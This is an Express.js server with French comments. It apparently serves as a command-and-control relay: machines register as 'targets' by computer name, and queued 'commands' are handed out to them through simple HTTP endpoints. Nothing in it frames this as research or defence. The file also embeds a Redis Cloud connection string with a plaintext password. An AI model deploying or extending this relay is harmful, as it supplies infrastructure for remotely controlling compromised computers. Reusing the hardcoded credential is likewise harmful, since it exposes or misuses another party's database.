const express = require('express');
const Redis = require('ioredis');
const app = express();

// Configuration Redis
const redis = new Redis('redis://default:KJigfboh7I4DYdXfJMXbaq79hTRZ4o3J@redis-19821.c14.us-east-1-2.ec2.redns.redis-cloud.com:19821');

redis.on('connect', () => {
    console.log('Connecté à Redis');
});

redis.on('error', (err) => {
    console.error('Erreur Redis: ', err);
});

// Middleware
app.use(express.json());

// Lire les données depuis Redis
const readData = async () => {
    try {
        const data = await redis.get('data');
        return data ? JSON.parse(data) : { cibleList: [], commandes: [], reponses: [] };
    } catch (err) {
        console.error("Erreur lors de la lecture de Redis:", err);
        return { cibleList: [], commandes: [], reponses: [] };
    }
};

// Écrire les données dans Redis
const writeData = async (data) => {
    try {
        await redis.set('data', JSON.stringify(data));
    } catch (err) {
        console.error("Erreur lors de l'écriture dans Redis:", err);
    }
};

// Point de terminaison de base
app.get('/', (req, res) => {
    res.send({ message: 'Bridge Com !' });
});

// Récupération de la liste des cibles
app.get('/cibles', async (req, res) => {
    const data = await readData();
    res.json({ cibleList: data.cibleList });
});

// Récupération de la liste des commandes
app.get('/commandes', async (req, res) => {
    const data = await readData();
    res.json({ commandes: data.commandes });
});

// Ajout d'un nom d'ordinateur
app.post('/identify', async (req, res) => {
    const { computer_name = 'Unknown' } = req.body;
    const data = await readData();
    data.cibleList.push(computer_name);
    await writeData(data);
    res.json({ message: `Request from computer: ${computer_name}`, cibleList: data.cibleList });
});

// Ajout d'une commande
app.post('/commande', async (req, res) => {
    const { commande } = req.body;
    if (!commande) {
        return res.status(400).json({ message: "Commande est requise." });
    }
    const data = await readData();

    let isExist = false;

    for (let i = 0; i < data.commandes.length; i++) {
        const dataInfo = data.commandes[i].split("%");
        const cmdInfo = commande.split("%");
        if (dataInfo[0] == cmdInfo[0]) {
            data.commandes[i] = commande;
            isExist = true;
        }
    }

    if (!isExist) data.commandes.push(commande);
    await writeData(data);
    res.json({ message: `Commande ajoutée: ${commande}`, commandes: data.commandes });
});

// Écoute sur le port
const PORT = 5000;
app.listen(PORT, () => console.log(`🚀 @ http://localhost:${PORT}`));
